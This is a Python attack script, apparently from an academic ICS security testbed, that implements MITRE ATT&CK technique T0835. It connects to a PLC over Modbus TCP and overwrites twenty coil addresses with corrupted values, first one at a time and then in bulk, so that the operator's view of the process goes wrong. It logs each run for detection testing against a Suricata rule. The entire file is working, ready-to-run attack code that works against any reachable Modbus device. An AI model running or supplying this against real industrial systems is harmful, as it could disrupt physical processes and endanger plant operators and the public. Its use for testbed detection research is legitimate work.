#!/usr/bin/env python3
"""
ASCEND-PG attacks/manipulate_io_image.py

MITRE ATT&CK for ICS: T0835 — Manipulate I/O Image.

Simulates an attacker corrupting the SCADA's I/O image by rapidly
writing to multiple coil and discrete input addresses. In a real ICS,
this would cause the operator's HMI to display incorrect process states,
leading to wrong control decisions.

Implementation:
  - Uses pymodbus FC05 (Write Single Coil) and FC15 (Write Multiple Coils)
    to write corrupted values to a range of coil addresses (0-19)
  - Each coil write represents a manipulated discrete I/O point
  - Detection: Suricata catches the coil writes (SID 9000007)

Run this ON THE ATTACKER HOST:
    python3 attacks/manipulate_io_image.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    print("[manipulate_io] ERROR: pymodbus not installed. Run: pip install pymodbus")
    sys.exit(1)

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

# Range of coil addresses to corrupt (discrete I/O points)
DEFAULT_COIL_START = 0
DEFAULT_COIL_COUNT = 20


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def run_manipulate_io(target: str, port: int, unit: int,
                      start_coil: int, coil_count: int,
                      delay: float, log_path: Path) -> dict:
    """Write corrupted values to multiple coil addresses to corrupt the I/O image.

    Returns dict with stats.
    """
    stats = {"coils_written": 0, "errors": 0}

    print(f"[manipulate_io] Connecting to {target}:{port} (unit={unit})")
    client = ModbusTcpClient(target, port=port, timeout=5)
    if not client.connect():
        print(f"[manipulate_io] ERROR: Cannot connect to {target}:{port}")
        return stats

    try:
        end_coil = start_coil + coil_count - 1
        print(f"[manipulate_io] Corrupting I/O image: coils {start_coil}-{end_coil} "
              f"({coil_count} addresses)")

        # Phase 1: Write each coil individually with alternating values
        for addr in range(start_coil, start_coil + coil_count):
            # Alternate between True/False to create inconsistent I/O image
            value = bool((addr - start_coil) % 2)
            try:
                result = client.write_coil(addr, value, slave=unit)
                if result.isError():
                    print(f"[manipulate_io] Coil {addr} write error: {result}")
                    stats["errors"] += 1
                else:
                    stats["coils_written"] += 1
            except Exception as exc:
                print(f"[manipulate_io] Coil {addr} exception: {exc}")
                stats["errors"] += 1

            if delay > 0:
                time.sleep(delay)

        # Phase 2: Bulk write using FC15 (Write Multiple Coils) to overwrite
        # the same range with all True — creates a "stuck at on" I/O image
        print(f"[manipulate_io] Bulk-overwriting coils {start_coil}-{end_coil}")
        try:
            values = [True] * coil_count
            result = client.write_coils(start_coil, values, slave=unit)
            if result.isError():
                print(f"[manipulate_io] Bulk coil write error: {result}")
                stats["errors"] += 1
            else:
                stats["coils_written"] += coil_count
                print(f"[manipulate_io] Bulk write successful ({coil_count} coils)")
        except Exception as exc:
            print(f"[manipulate_io] Bulk write exception: {exc}")
            stats["errors"] += 1

    except Exception as exc:
        print(f"[manipulate_io] Unexpected error: {exc}")
        stats["errors"] += 1
    finally:
        client.close()

    return stats


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Manipulate I/O Image (T0835) — corrupt SCADA's "
                    "discrete I/O image by writing to multiple coil addresses"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP address")
    parser.add_argument("-p", "--port", type=int, default=502,
                        help="Modbus TCP port (default: 502)")
    parser.add_argument("-u", "--unit", type=int, default=1,
                        help="Modbus unit/slave ID (default: 1)")
    parser.add_argument("--coil-start", type=int, default=DEFAULT_COIL_START,
                        help=f"First coil address (default: {DEFAULT_COIL_START})")
    parser.add_argument("--coil-count", type=int, default=DEFAULT_COIL_COUNT,
                        help=f"Number of coils to corrupt (default: {DEFAULT_COIL_COUNT})")
    parser.add_argument("-d", "--delay", type=float, default=0.05,
                        help="Delay between individual writes in seconds (default: 0.05)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0835",
        "action": "manipulate_io_start",
        "target": args.target,
        "coil_range": f"{args.coil_start}-{args.coil_start + args.coil_count - 1}",
    })

    stats = run_manipulate_io(
        args.target, args.port, args.unit,
        args.coil_start, args.coil_count, args.delay, log_path,
    )

    log_event(log_path, {
        "stage": "attack", "technique": "T0835",
        "action": "manipulate_io_end",
        "target": args.target,
        "coils_written": stats["coils_written"],
        "errors": stats["errors"],
    })

    print(f"\n[manipulate_io] Done — {stats['coils_written']} coils written, "
          f"{stats['errors']} errors")


if __name__ == "__main__":
    main()
